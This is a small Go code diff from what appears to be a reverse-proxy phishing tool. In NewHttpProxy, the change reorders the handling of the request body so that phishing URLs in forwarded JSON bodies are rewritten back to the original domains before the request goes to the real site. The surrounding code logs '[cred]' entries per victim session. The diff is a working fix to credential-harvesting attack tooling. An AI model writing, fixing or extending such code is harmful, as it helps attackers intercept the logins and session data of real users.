@@ -745,10 +745,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
-						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
-
-						// patch phishing URLs in JSON body with original domains
+						// patch phishing URLs in JSON body with original domains BEFORE forwarding
 						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
+						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 						req.ContentLength = int64(len(body))
 
 						log.Debug("[cred] host=%s path=%s method=%s sessionId=%s ct=%s bodyLen=%d", req.Host, req.URL.Path, req.Method, ps.SessionId, req.Header.Get("Content-Type"), len(body))
